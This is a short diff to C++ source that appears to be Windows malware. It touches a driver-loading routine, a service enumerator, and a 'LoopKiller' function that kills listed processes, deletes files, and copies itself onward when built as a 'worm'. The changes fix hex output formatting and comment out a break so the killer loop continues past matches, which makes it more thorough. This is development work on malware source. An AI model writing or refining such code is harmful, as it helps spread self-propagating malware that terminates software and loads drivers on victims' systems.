@@ -82,7 +82,7 @@ bool LoadDriver(const char* serviceName, char* driverPath) {
     // Start the service
     if (!StartServiceA(hService, 0, nullptr))
     {
-        cout << hex << GetLastError() << '\n';
+        cout << hex << GetLastError() << dec << '\n';
         CloseServiceHandle(hService);
         CloseServiceHandle(hSCM);
         return 0;
@@ -210,7 +210,7 @@ static void LogServiceList() {
     
     
     if(EnumServicesStatus(sc, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &bytesNeeded, &numServices, &resumeHandle) && GetLastError() != ERROR_MORE_DATA) {
-        cout << hex << GetLastError() << "A\n"; return;
+        cout << hex << GetLastError() << dec << "A\n"; return;
     }
 
     vector<BYTE> enumBuffer(bytesNeeded);
@@ -313,8 +313,8 @@ static int LoopKiller(const char* type, int count, const wchar_t* list[], int le
                     deleted = true;
                     if (buildType == BUILD_TYPE_WORM && isMainProcess) CopyTo(filePath);
                 }
-                killed = 1;
-                break;
+                //killed = 1;
+                //break;
                 continue;
             }
 
